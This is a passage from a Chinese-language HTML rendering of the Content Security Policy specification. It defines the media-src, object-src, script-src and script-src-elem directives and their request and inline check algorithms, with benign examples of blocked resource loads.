                        <var>response</var>、<var>request</var>、该指令的 <a data-link-type="dfn" href="#directive-value"
                            id="ref-for-directive-value②⑨">值</a> 和 <var>policy</var> 的结果为 "<code>不匹配</code>"，则返回
                        "<code>Blocked</code>"。
                    </p>
                <li data-md>
                    <p>返回 "<code>Allowed</code>"。</p>
            </ol>
            <h4 class="heading settled" data-level="6.1.8" id="directive-media-src"><span class="secno">6.1.8.
                </span><span class="content"><code>media-src</code></span><a class="self-link"
                    href="#directive-media-src"></a></h4>
            <p><dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="media-src">media-src</dfn> 指令限制从哪个 URL
                加载视频、音频和相关的文本轨资源。该指令名称和值的语法由以下 ABNF 描述：</p>
            <pre>directive-name  = "media-src"
directive-value = <a data-link-type="grammar" href="#grammardef-serialized-source-list" id="ref-for-grammardef-serialized-source-list⑦">serialized-source-list</a>
</pre>
            <div class="example" id="example-ae1d2bb7">
                <a class="self-link" href="#example-ae1d2bb7"></a> 给定一个包含以下内容安全策略的页面：
                <pre><a data-link-type="http-header" href="#header-content-security-policy" id="ref-for-header-content-security-policy①②">Content-Security-Policy</a>: <a data-link-type="dfn" href="#media-src" id="ref-for-media-src②">media-src</a> https://example.com/
</pre>
                <p>以下代码的请求将返回网络错误，因为提供的 URL 与 <code>media-src</code> 的 <a data-link-type="dfn" href="#source-lists"
                        id="ref-for-source-lists⑧">来源列表</a>不匹配：</p>
                <pre class="highlight"><c- p>&lt;</c-><c- f>audio</c-> <c- e>src</c-><c- o>=</c-><c- s>"https://example.org/audio"</c-><c- p>>&lt;/</c-><c- f>audio</c-><c- p>></c->
<c- p>&lt;</c-><c- f>video</c-> <c- e>src</c-><c- o>=</c-><c- s>"https://example.org/video"</c-><c- p>></c->
    <c- p>&lt;</c-><c- f>track</c-> <c- e>kind</c-><c- o>=</c-><c- s>"subtitles"</c-> <c- e>src</c-><c- o>=</c-><c- s>"https://example.org/subtitles"</c-><c- p>></c->
<c- p>&lt;/</c-><c- f>video</c-><c- p>></c->
</pre>
            </div>
            <h5 class="heading settled algorithm" data-algorithm="media-src Pre-request check" data-level="6.1.8.1"
                id="media-src-pre-request"><span class="secno">6.1.8.1. </span><span
                    class="content"><code>media-src</code> 预请求检查 </span><a class="self-link"
                    href="#media-src-pre-request"></a></h5>
            <p>该指令的 <a data-link-type="dfn" href="#directive-pre-request-check"
                    id="ref-for-directive-pre-request-check①⓪">预请求检查</a> 如下：</p>
            <p>给定一个 <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request"
                    id="ref-for-concept-request③⑥">请求</a> <var>request</var> 和一个 <a data-link-type="dfn"
                    href="#content-security-policy-object" id="ref-for-content-security-policy-object④④">策略</a>
                <var>policy</var>：
            </p>
            <ol>
                <li data-md>
                    <p>将 <var>name</var> 设置为执行 <a href="#effective-directive-for-a-request">§ 6.8.1 获取请求的有效指令</a> 对
                        <var>request</var> 的结果。
                    </p>
                <li data-md>
                    <p>如果执行 <a href="#should-directive-execute">§ 6.8.4 是否应执行提取指令</a> 对
                        <var>name</var>、<code>media-src</code> 和 <var>policy</var> 的结果为 "<code>No</code>"，则返回
                        "<code>Allowed</code>"。
                    </p>
                <li data-md>
                    <p>如果执行 <a href="#match-request-to-source-list">§ 6.7.2.5 请求是否匹配来源列表？</a> 对 <var>request</var>、该指令的
                        <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value③⓪">值</a> 和
                        <var>policy</var> 的结果为 "<code>不匹配</code>"，则返回 "<code>Blocked</code>"。
                    </p>
                <li data-md>
                    <p>返回 "<code>Allowed</code>"。</p>
            </ol>
            <h5 class="heading settled algorithm" data-algorithm="media-src Post-request check" data-level="6.1.8.2"
                id="media-src-post-request"><span class="secno">6.1.8.2. </span><span
                    class="content"><code>media-src</code> 请求后检查 </span><a class="self-link"
                    href="#media-src-post-request"></a></h5>
            <p>该指令的 <a data-link-type="dfn" href="#directive-post-request-check"
                    id="ref-for-directive-post-request-check①①">请求后检查</a> 如下：</p>
            <p>给定一个 <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request"
                    id="ref-for-concept-request③⑦">请求</a> <var>request</var>，一个 <a data-link-type="dfn"
                    href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response①⑦">响应</a>
                <var>response</var>，和一个 <a data-link-type="dfn" href="#content-security-policy-object"
                    id="ref-for-content-security-policy-object④⑤">策略</a> <var>policy</var>：
            </p>
            <ol>
                <li data-md>
                    <p>将 <var>name</var> 设置为执行 <a href="#effective-directive-for-a-request">§ 6.8.1 获取请求的有效指令</a> 对
                        <var>request</var> 的结果。
                    </p>
                <li data-md>
                    <p>如果执行 <a href="#should-directive-execute">§ 6.8.4 是否应执行提取指令</a> 对
                        <var>name</var>、<code>media-src</code> 和 <var>policy</var> 的结果为 "<code>No</code>"，则返回
                        "<code>Allowed</code>"。
                    </p>
                <li data-md>
                    <p>如果执行 <a href="#match-response-to-source-list">§ 6.7.2.6 请求的响应是否匹配来源列表？</a> 对
                        <var>response</var>、<var>request</var>、该指令的 <a data-link-type="dfn" href="#directive-value"
                            id="ref-for-directive-value③①">值</a> 和 <var>policy</var> 的结果为 "<code>不匹配</code>"，则返回
                        "<code>Blocked</code>"。
                    </p>
                <li data-md>
                    <p>返回 "<code>Allowed</code>"。</p>
            </ol>
            <h4 class="heading settled" data-level="6.1.9" id="directive-object-src"><span class="secno">6.1.9.
                </span><span class="content"><code>object-src</code></span><a class="self-link"
                    href="#directive-object-src"></a></h4>
            <p><dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="object-src">object-src</dfn> 指令限制从哪个 URL
                加载插件内容。该指令名称和值的语法由以下 ABNF 描述：</p>
            <pre>directive-name  = "object-src"
directive-value = <a data-link-type="grammar" href="#grammardef-serialized-source-list" id="ref-for-grammardef-serialized-source-list⑧">serialized-source-list</a>
</pre>
            <div class="example" id="example-567c9ecc">
                <a class="self-link" href="#example-567c9ecc"></a> 给定一个包含以下内容安全策略的页面：
                <pre><a data-link-type="http-header" href="#header-content-security-policy" id="ref-for-header-content-security-policy①③">Content-Security-Policy</a>: <a data-link-type="dfn" href="#object-src" id="ref-for-object-src③">object-src</a> https://example.com/
</pre>
                <p>以下代码的请求将返回网络错误，因为提供的 URL 与 <code>object-src</code> 的 <a data-link-type="dfn" href="#source-lists"
                        id="ref-for-source-lists⑨">来源列表</a>不匹配：</p>
                <pre class="highlight"><c- p>&lt;</c-><c- f>embed</c-> <c- e>src</c-><c- o>=</c-><c- s>"https://example.org/flash"</c-><c- p>>&lt;/</c-><c- f>embed</c-><c- p>></c->
<c- p>&lt;</c-><c- f>object</c-> <c- e>data</c-><c- o>=</c-><c- s>"https://example.org/flash"</c-><c- p>>&lt;/</c-><c- f>object</c-><c- p>></c->
</pre>
            </div>
            <p>如果插件内容加载时没有关联的
                URL（例如，<code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element" id="ref-for-the-object-element">object</a></code>
                元素缺少
                <code><a data-link-type="element-sub" href="https://html.spec.whatwg.org/multipage/iframe-embed-object.html#attr-object-data" id="ref-for-attr-object-data">data</a></code>
                属性，但基于指定的 <code>type</code> 加载一些默认插件），如果 <code>object-src</code> 的值为 <code>'none'</code>，则必须阻止加载，否则允许加载。
            </p>
            <p class="note" role="note"><span class="marker">注意：</span> <code>object-src</code> 指令作用于任何由
                <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element" id="ref-for-the-object-element①">object</a></code>
                或
                <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-embed-element" id="ref-for-the-embed-element">embed</a></code>
                元素发起的请求。这包括前两者生成的 <a data-link-type="dfn"
                    href="https://html.spec.whatwg.org/multipage/document-sequences.html#child-navigable"
                    id="ref-for-child-navigable②">子导航项</a>的请求（也包括导航）。即使数据在语义上等同于其他指令限制的内容，例如具有 <code>text/html</code>
                MIME 类型的
                <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element" id="ref-for-the-object-element②">object</a></code>
                元素，这也适用。
            </p>
            <p class="note" role="note"><span class="marker">注意：</span> 当插件资源直接导航到（即作为 <a data-link-type="dfn"
                    href="https://html.spec.whatwg.org/#plugin" id="ref-for-plugin">插件</a>在 <a data-link-type="dfn"
                    href="https://html.spec.whatwg.org/#navigable" id="ref-for-navigable②">导航项</a>内，而不是通过
                <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-embed-element" id="ref-for-the-embed-element①">embed</a></code>
                或
                <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element" id="ref-for-the-object-element③">object</a></code>
                作为嵌入的子资源），该资源随附的任何 <a data-link-type="dfn" href="#content-security-policy-object"
                    id="ref-for-content-security-policy-object④⑥">策略</a>都将应用于结果 <code
                    class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#document" id="ref-for-document⑧">Document</a></code>。例如，开发人员可以通过随响应一起提供策略
                <code>object-src 'none'</code> 来阻止任意资源作为插件内容的执行。鉴于插件的强大功能（以及 Flash 等插件有时呈现的特殊安全模型），这可以减轻如 <a
                    href="https://miki.it/blog/2014/7/8/abusing-jsonp-with-rosetta-flash/">Rosetta Flash</a> 等攻击向量的风险。
            </p>
            <h5 class="heading settled algorithm" data-algorithm="object-src Pre-request check" data-level="6.1.9.1"
                id="object-src-pre-request"><span class="secno">6.1.9.1. </span><span
                    class="content"><code>object-src</code> 预请求检查 </span><a class="self-link"
                    href="#object-src-pre-request"></a></h5>
            <p>该指令的 <a data-link-type="dfn" href="#directive-pre-request-check"
                    id="ref-for-directive-pre-request-check①①">预请求检查</a> 如下：</p>
            <p>给定一个 <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request"
                    id="ref-for-concept-request③⑧">请求</a> <var>request</var> 和一个 <a data-link-type="dfn"
                    href="#content-security-policy-object" id="ref-for-content-security-policy-object④⑦">策略</a>
                <var>policy</var>：
            </p>
            <ol>
                <li data-md>
                    <p>将 <var>name</var> 设置为执行 <a href="#effective-directive-for-a-request">§ 6.8.1 获取请求的有效指令</a> 对
                        <var>request</var> 的结果。
                    </p>
                <li data-md>
                    <p>如果执行 <a href="#should-directive-execute">§ 6.8.4 是否应执行提取指令</a> 对
                        <var>name</var>、<code>object-src</code> 和 <var>policy</var> 的结果为 "<code>No</code>"，则返回
                        "<code>Allowed</code>"。
                    </p>
                <li data-md>
                    <p>如果执行 <a href="#match-request-to-source-list">§ 6.7.2.5 请求是否匹配来源列表？</a> 对 <var>request</var>、该指令的
                        <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value③②">值</a> 和
                        <var>policy</var> 的结果为 "<code>不匹配</code>"，则返回 "<code>Blocked</code>"。
                    </p>
                <li data-md>
                    <p>返回 "<code>Allowed</code>"。</p>
            </ol>
            <h5 class="heading settled algorithm" data-algorithm="object-src Post-request check" data-level="6.1.9.2"
                id="object-src-post-request"><span class="secno">6.1.9.2. </span><span
                    class="content"><code>object-src</code> 请求后检查 </span><a class="self-link"
                    href="#object-src-post-request"></a></h5>
            <p>该指令的 <a data-link-type="dfn" href="#directive-post-request-check"
                    id="ref-for-directive-post-request-check①②">请求后检查</a> 如下：</p>
            <p>给定一个 <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request"
                    id="ref-for-concept-request③⑨">请求</a> <var>request</var>，一个 <a data-link-type="dfn"
                    href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response①⑧">响应</a>
                <var>response</var>，和一个 <a data-link-type="dfn" href="#content-security-policy-object"
                    id="ref-for-content-security-policy-object④⑧">策略</a> <var>policy</var>：
            </p>
            <ol>
                <li data-md>
                    <p>将 <var>name</var> 设置为执行 <a href="#effective-directive-for-a-request">§ 6.8.1 获取请求的有效指令</a> 对
                        <var>request</var> 的结果。
                    </p>
                <li data-md>
                    <p>如果执行 <a href="#should-directive-execute">§ 6.8.4 是否应执行提取指令</a> 对
                        <var>name</var>、<code>object-src</code> 和 <var>policy</var> 的结果为 "<code>No</code>"，则返回
                        "<code>Allowed</code>"。
                    </p>
                <li data-md>
                    <p>如果执行 <a href="#match-response-to-source-list">§ 6.7.2.6 请求的响应是否匹配来源列表？</a> 对
                        <var>response</var>、<var>request</var>、该指令的 <a data-link-type="dfn" href="#directive-value"
                            id="ref-for-directive-value③③">值</a> 和 <var>policy</var> 的结果为 "<code>不匹配</code>"，则返回
                        "<code>Blocked</code>"。
                    </p>
                <li data-md>
                    <p>返回 "<code>Allowed</code>"。</p>
            </ol>
            <h4 class="heading settled" data-level="6.1.10" id="directive-script-src"><span class="secno">6.1.10.
                </span><span class="content"><code>script-src</code></span><a class="self-link"
                    href="#directive-script-src"></a></h4>
            <p><dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="script-src">script-src</dfn>
                指令限制脚本可执行的位置。这不仅包括直接加载到
                <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script" id="ref-for-script③">script</a></code>
                元素中的 URL，还包括内联脚本块和可触发脚本执行的 XSLT 样式表 <a data-link-type="biblio" href="#biblio-xslt"
                    title="XSL Transformations (XSLT) Version 1.0">[XSLT]</a>。该指令名称和值的语法由以下 ABNF 描述：
            </p>
            <pre>directive-name  = "script-src"
directive-value = <a data-link-type="grammar" href="#grammardef-serialized-source-list" id="ref-for-grammardef-serialized-source-list⑨">serialized-source-list</a>
</pre>
            <p><code>script-src</code> 指令作为所有 <a data-link-type="dfn"
                    href="https://fetch.spec.whatwg.org/#request-destination-script-like"
                    id="ref-for-request-destination-script-like②">类脚本</a>目标的默认回退（包括 worker 特定的目标，如果没有 <a
                    data-link-type="dfn" href="#worker-src"
                    id="ref-for-worker-src②"><code>worker-src</code></a>）。除非需要细粒度控制，否则应该使用 <code>script-src</code> 而不是
                <a data-link-type="dfn" href="#script-src-attr"
                    id="ref-for-script-src-attr②"><code>script-src-attr</code></a> 和 <a data-link-type="dfn"
                    href="#script-src-elem"
                    id="ref-for-script-src-elem③"><code>script-src-elem</code></a>，因为在大多数情况下，没有理由为内联事件处理程序和
                <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script" id="ref-for-script④">script</a></code>
                元素维护单独的权限列表。
            </p>
            <p><code>script-src</code> 指令控制以下六个方面：</p>
            <ol>
                <li data-md>
                    <p>脚本 <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request"
                            id="ref-for-concept-request④⓪">请求</a> 必须通过 <a href="#should-block-request"
                            id="ref-for-should-block-request④">§ 4.1.2 内容安全策略是否应阻止请求？</a>。</p>
                <li data-md>
                    <p>脚本 <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response"
                            id="ref-for-concept-response①⑨">响应</a> 必须通过 <a href="#should-block-response"
                            id="ref-for-should-block-response④">§ 4.1.3 内容安全策略是否应阻止请求的响应？</a>。</p>
                <li data-md>
                    <p>内联
                        <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script" id="ref-for-script⑤">script</a></code>
                        块必须通过 <a href="#should-block-inline" id="ref-for-should-block-inline④">§ 4.2.3
                            内容安全策略是否应阻止元素的内联类型行为？</a>。除非每个策略都允许内联脚本（要么隐式地没有指定 <code>script-src</code> 或
                        <code>default-src</code> 指令，要么显式地指定 "<code>unsafe-inline</code>"、与内联块匹配的 <a
                            data-link-type="grammar" href="#grammardef-nonce-source"
                            id="ref-for-grammardef-nonce-source②">nonce-source</a> 或 <a data-link-type="grammar"
                            href="#grammardef-hash-source"
                            id="ref-for-grammardef-hash-source②">hash-source</a>），其行为将被阻止。
                    </p>
                <li data-md>
                    <p>以下 JavaScript 执行接收器受“<code>unsafe-eval</code>”和“<code>trusted-types-eval</code>”源表达式的限制：</p>
                    <ul>
                        <li data-md>
                            <p><code
                                    class="idl"><a data-link-type="idl" href="https://tc39.github.io/ecma262#sec-eval-x" id="ref-for-sec-eval-x①">eval()</a></code>
                            </p>
                        <li data-md>
                            <p><code
                                    class="idl"><a data-link-type="idl" href="https://tc39.github.io/ecma262#sec-function-objects" id="ref-for-sec-function-objects">Function()</a></code>
                            </p>
                        <li data-md>
                            <p><code
                                    class="idl"><a data-link-type="idl" href="https://html.spec.whatwg.org/multipage/timers-and-user-prompts.html#dom-settimeout" id="ref-for-dom-settimeout">setTimeout()</a></code>
                                的第一个参数不是可调用对象。</p>
                        <li data-md>
                            <p><code
                                    class="idl"><a data-link-type="idl" href="https://html.spec.whatwg.org/multipage/timers-and-user-prompts.html#dom-setinterval" id="ref-for-dom-setinterval">setInterval()</a></code>
                                的第一个参数不是可调用对象。</p>
                    </ul>
                    <p class="note" role="note"><span class="marker">注意：</span> 如果用户代理实现了非标准接收器，例如
                        <code>setImmediate()</code> 或 <code>execScript()</code>，它们也应该基于 "<code>unsafe-eval</code>"
                        进行控制。<br><span class="marker">注意：</span> 由于 "<code>unsafe-eval</code>" 充当全局页面标志，因此在执行此检查时不使用 <a
                            data-link-type="dfn" href="#script-src-attr"
                            id="ref-for-script-src-attr③"><code>script-src-attr</code></a> 和 <a data-link-type="dfn"
                            href="#script-src-elem"
                            id="ref-for-script-src-elem④"><code>script-src-elem</code></a>，而是始终使用
                        <code>script-src</code>（或其回退指令）。
                    </p>
                <li data-md>
                    <p>以下 WebAssembly 执行接收器基于 "<code>wasm-unsafe-eval</code>" 或 "<code>unsafe-eval</code>" 源表达式进行控制：</p>
                    <ul>
                        <li data-md>
                            <p><code
                                    class="idl"><a data-link-type="idl" href="https://webassembly.github.io/spec/js-api/#dom-module-module" id="ref-for-dom-module-module">new WebAssembly.Module()</a></code>
                            </p>
                        <li data-md>
                            <p><code
                                    class="idl"><a data-link-type="idl" href="https://webassembly.github.io/spec/js-api/#dom-webassembly-compile" id="ref-for-dom-webassembly-compile">WebAssembly.compile()</a></code>
                            </p>
                        <li data-md>
                            <p><code
                                    class="idl"><a data-link-type="idl" href="https://webassembly.github.io/spec/web-api/#dom-webassembly-compilestreaming" id="ref-for-dom-webassembly-compilestreaming">WebAssembly.compileStreaming()</a></code>
                            </p>
                        <li data-md>
                            <p><code
                                    class="idl"><a data-link-type="idl" href="https://webassembly.github.io/spec/js-api/#dom-webassembly-instantiate" id="ref-for-dom-webassembly-instantiate">WebAssembly.instantiate()</a></code>
                            </p>
                        <li data-md>
                            <p><code
                                    class="idl"><a data-link-type="idl" href="https://webassembly.github.io/spec/web-api/#dom-webassembly-instantiatestreaming" id="ref-for-dom-webassembly-instantiatestreaming">WebAssembly.instantiateStreaming()</a></code>
                            </p>
                    </ul>
                    <p class="note" role="note"><span class="marker">注意：</span> "<code>wasm-unsafe-eval</code>"
                        源表达式是更具体的源表达式。特别是，"<code>unsafe-eval</code>" 允许 WebAssembly 的编译（和实例化），同时也允许例如 JavaScript 中的
                        "<code>eval</code>" 操作。"<code>wasm-unsafe-eval</code>" 源表达式只允许 WebAssembly，并不影响 JavaScript。</p>
                <li data-md>
                    <p>导航到 <code>javascript:</code> URL 必须通过 <a href="#should-block-inline"
                            id="ref-for-should-block-inline⑤">§ 4.2.3
                            内容安全策略是否应阻止元素的内联类型行为？</a>。如上所述，只有每个策略都允许内联脚本时，这样的导航才会执行脚本。</p>
            </ol>
            <h5 class="heading settled algorithm" data-algorithm="script-src 预请求检查" data-level="6.1.10.1"
                id="script-src-pre-request"><span class="secno">6.1.10.1. </span><span
                    class="content"><code>script-src</code> 预请求检查</span><a class="self-link"
                    href="#script-src-pre-request"></a></h5>
            <p>此指令的 <a data-link-type="dfn" href="#directive-pre-request-check"
                    id="ref-for-directive-pre-request-check①②">预请求检查</a>如下：</p>
            <p>给定一个 <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request"
                    id="ref-for-concept-request④①">请求</a> <var>request</var> 和一个 <a data-link-type="dfn"
                    href="#content-security-policy-object" id="ref-for-content-security-policy-object④⑨">策略</a>
                <var>policy</var>：
            </p>
            <ol>
                <li data-md>
                    <p>将 <var>name</var> 设为执行 <a href="#effective-directive-for-a-request">§ 6.8.1 获取请求的有效指令</a> 在
                        <var>request</var> 上的结果。
                    </p>
                </li>
                <li data-md>
                    <p>如果执行 <a href="#should-directive-execute">§ 6.8.4 是否应执行取指令</a> 在
                        <var>name</var>、<code>script-src</code> 和 <var>policy</var> 上的结果为 "<code>No</code>"，则返回
                        "<code>Allowed</code>"。
                    </p>
                </li>
                <li data-md>
                    <p>返回执行 <a href="#script-pre-request">§ 6.7.1.1 脚本指令预请求检查</a> 在 <var>request</var>、该指令和
                        <var>policy</var> 上的结果。
                    </p>
                </li>
            </ol>
            <h5 class="heading settled algorithm" data-algorithm="script-src 后请求检查" data-level="6.1.10.2"
                id="script-src-post-request"><span class="secno">6.1.10.2. </span><span
                    class="content"><code>script-src</code> 后请求检查</span><a class="self-link"
                    href="#script-src-post-request"></a></h5>
            <p>此指令的 <a data-link-type="dfn" href="#directive-post-request-check"
                    id="ref-for-directive-post-request-check①③">后请求检查</a>如下：</p>
            <p>给定一个 <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request"
                    id="ref-for-concept-request④⓪">请求</a> <var>request</var>，一个 <a data-link-type="dfn"
                    href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response①⑨">响应</a>
                <var>response</var>，和一个 <a data-link-type="dfn" href="#content-security-policy-object"
                    id="ref-for-content-security-policy-object④⑧">策略</a> <var>policy</var>：
            </p>
            <ol>
                <li data-md>
                    <p>将 <var>name</var> 设为执行 <a href="#effective-directive-for-a-request">§ 6.8.1 获取请求的有效指令</a> 在
                        <var>request</var> 上的结果。
                    </p>
                </li>
                <li data-md>
                    <p>如果执行 <a href="#should-directive-execute">§ 6.8.4 是否应执行取指令</a> 在
                        <var>name</var>、<code>script-src</code> 和 <var>policy</var> 上的结果为 "<code>No</code>"，则返回
                        "<code>Allowed</code>"。
                    </p>
                </li>
                <li data-md>
                    <p>返回执行 <a href="#script-post-request">§ 6.7.1.2 脚本指令后请求检查</a> 在
                        <var>request</var>、<var>response</var>、该指令和 <var>policy</var> 上的结果。
                    </p>
                </li>
            </ol>
            <h5 class="heading settled algorithm" data-algorithm="script-src 内联检查" data-level="6.1.10.3"
                id="script-src-inline"><span class="secno">6.1.10.3. </span><span
                    class="content"><code>script-src</code> 内联检查</span><a class="self-link"
                    href="#script-src-inline"></a></h5>
            <p>此指令的 <a data-link-type="dfn" href="#directive-inline-check"
                    id="ref-for-directive-inline-check④">内联检查</a>算法如下：</p>
            <p>给定一个 <code
                    class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#element" id="ref-for-element③">元素</a></code>
                <var>element</var>，一个字符串 <var>type</var>，一个 <a data-link-type="dfn"
                    href="#content-security-policy-object" id="ref-for-content-security-policy-object④⑨">策略</a>
                <var>policy</var> 和一个字符串 <var>source</var>：
            </p>
            <ol>
                <li data-md>
                    <p class="assertion">断言：<var>element</var> 不为 null 或 <var>type</var> 为 "<code>navigation</code>"。
                    </p>
                </li>
                <li data-md>
                    <p>将 <var>name</var> 设为执行 <a href="#effective-directive-for-inline-check">§ 6.8.2 获取内联检查的有效指令</a> 在
                        <var>type</var> 上的结果。
                    </p>
                </li>
                <li data-md>
                    <p>如果执行 <a href="#should-directive-execute">§ 6.8.4 是否应执行取指令</a> 在
                        <var>name</var>、<code>script-src</code> 和 <var>policy</var> 上的结果为 "<code>No</code>"，则返回
                        "<code>Allowed</code>"。
                    </p>
                </li>
                <li data-md>
                    <p>如果执行 <a href="#match-element-to-source-list">§ 6.7.3.3 元素是否匹配类型和源的源列表？</a> 在
                        <var>element</var>、该指令的 <a data-link-type="dfn" href="#directive-value"
                            id="ref-for-directive-value③⓪">值</a>、<var>type</var> 和 <var>source</var> 上的结果为
                        "<code>Does Not Match</code>"，则返回 "<code>Blocked</code>"。
                    </p>
                </li>
                <li data-md>
                    <p>返回 "<code>Allowed</code>"。</p>
                </li>
            </ol>
            <h4 class="heading settled" data-level="6.1.11" id="directive-script-src-elem"><span class="secno">6.1.11.
                </span><span class="content"><code>script-src-elem</code></span><a class="self-link"
                    href="#directive-script-src-elem"></a></h4>
            <p>此指令的名称和值的语法如下 ABNF 描述：</p>
            <pre>directive-name  = "script-src-elem"
directive-value = <a data-link-type="grammar" href="#grammardef-serialized-source-list" id="ref-for-grammardef-serialized-source-list①⓪">serialized-source-list</a>
</pre>
            <p><dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="script-src-elem">script-src-elem</dfn>
                指令适用于所有脚本请求和脚本块。执行脚本的属性（内联事件处理程序）通过 <a data-link-type="dfn" href="#script-src-attr"
                    id="ref-for-script-src-attr④"><code>script-src-attr</code></a> 进行控制。</p>
            <p>因此，与 <code>script-src</code> 相比，存在以下区别：</p>
            <ul>
                <li data-md>
                    <p><code>script-src-elem</code> 适用于 <code>|type|</code> 为 "<code>script</code>" 和
                        "<code>navigation</code>" 的内联检查（对于 <code>|type|</code> 为 "<code>script attribute</code>"
                        的内联检查忽略）。</p>
                </li>
                <li data-md>
                    <p><code>script-src-elem</code> 的 <a data-link-type="dfn" href="#directive-value"
                            id="ref-for-directive-value③①">值</a> 不用于基于 "<code>unsafe-eval</code>" 检查的 JavaScript 执行插槽检查。
                    </p>
                </li>
                <li data-md>
                    <p><code>script-src-elem</code> 不用作 <code>worker-src</code> 指令的回退。<code>worker-src</code> 检查仍然回退到
                        <code>script-src</code> 指令。
                    </p>
                </li>
            </ul>
            <h5 class="heading settled algorithm" data-algorithm="script-src-elem 预请求检查" data-level="6.1.11.1"
                id="script-src-elem-pre-request"><span class="secno">6.1.11.1. </span><span
                    class="content"><code>script-src-elem</code> 预请求检查</span><a class="self-link"
                    href="#script-src-elem-pre-request"></a></h5>
            <p>此指令的 <a data-link-type="dfn" href="#directive-pre-request-check"
                    id="ref-for-directive-pre-request-check①③">预请求检查</a>如下：</p>
            <p>给定一个 <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request"
                    id="ref-for-concept-request④①">请求</a> <var>request</var> 和一个 <a data-link-type="dfn"
                    href="#content-security-policy-object" id="ref-for-content-security-policy-object⑤⓪">策略</a>
                <var>policy</var>：
            </p>
            <ol>
                <li data-md>
                    <p>将 <var>name</var> 设为执行 <a href="#effective-directive-for-a-request">§ 6.8.1 获取请求的有效指令</a> 在
                        <var>request</var> 上的结果。
                    </p>
                </li>
                <li data-md>
                    <p>如果执行 <a href="#should-directive-execute">§ 6.8.4 是否应执行取指令</a> 在
                        <var>name</var>、<code>script-src-elem</code> 和 <var>policy</var> 上的结果为 "<code>No</code>"，则返回
                        "<code>Allowed</code>"。
                    </p>
                </li>
                <li data-md>
                    <p>返回执行 <a href="#script-pre-request">§ 6.7.1.1 脚本指令预请求检查</a> 在 <var>request</var>、该指令和
                        <var>policy</var> 上的结果。
                    </p>
                </li>
            </ol>
            <h5 class="heading settled algorithm" data-algorithm="script-src-elem 后请求检查" data-level="6.1.11.2"
                id="script-src-elem-post-request"><span class="secno">6.1.11.2. </span><span
                    class="content"><code>script-src-elem</code> 后请求检查</span><a class="self-link"
                    href="#script-src-elem-post-request"></a></h5>
            <p>此指令的 <a data-link-type="dfn" href="#directive-post-request-check"
                    id="ref-for-directive-post-request-check①④">后请求检查</a>如下：</p>
            <p>给定一个 <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request"
                    id="ref-for-concept-request④②">请求</a> <var>request</var>，一个 <a data-link-type="dfn"
                    href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response②⓪">响应</a>
                <var>response</var>，和一个 <a data-link-type="dfn" href="#content-security-policy-object"
                    id="ref-for-content-security-policy-object⑤①">策略</a> <var>policy</var>：
            </p>
            <ol>
                <li data-md>
                    <p>将 <var>name</var> 设为执行 <a href="#effective-directive-for-a-request">§ 6.8.1 获取请求的有效指令</a> 在
                        <var>request</var> 上的结果。
                    </p>
                </li>
                <li data-md>
                    <p>如果执行 <a href="#should-directive-execute">§ 6.8.4 是否应执行取指令</a> 在
                        <var>name</var>、<code>script-src-elem</code> 和 <var>policy</var> 上的结果为 "<code>No</code>"，则返回
                        "<code>Allowed</code>"。
                    </p>
                </li>
                <li data-md>
                    <p>返回执行 <a href="#script-post-request">§ 6.7.1.2 脚本指令后请求检查</a> 在
                        <var>request</var>、<var>response</var>、该指令和 <var>policy</var> 上的结果。
                    </p>
                </li>
            </ol>
            <h5 class="heading settled algorithm" data-algorithm="script-src-elem 内联检查" data-level="6.1.11.3"
                id="script-src-elem-inline"><span class="secno">6.1.11.3. </span><span
                    class="content"><code>script-src-elem</code> 内联检查</span><a class="self-link"
                    href="#script-src-elem-inline"></a></h5>
            <p>此指令的 <a data-link-type="dfn" href="#directive-inline-check"
                    id="ref-for-directive-inline-check⑤">内联检查</a>算法如下：</p>
            <p>给定一个 <code
                    class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#element" id="ref-for-element④">元素</a></code>
                <var>element</var>，一个字符串 <var>type</var>，一个 <a data-link-type="dfn"
                    href="#content-security-policy-object" id="ref-for-content-security-policy-object⑤②">策略</a>
                <var>policy</var> 和一个字符串 <var>source</var>：
            </p>
            <ol>
                <li data-md>
                    <p class="assertion">断言：<var>element</var> 不为 null 或 <var>type</var> 为 "<code>navigation</code>"。
                    </p>
                </li>
                <li data-md>
                    <p>将 <var>name</var> 设为执行 <a href="#effective-directive-for-inline-check">§ 6.8.2 获取内联检查的有效指令</a> 在
                        <var>type</var> 上的结果。
                    </p>
                </li>
                <li data-md>
                    <p>如果执行 <a href="#should-directive-execute">§ 6.8.4 是否应执行取指令</a> 在
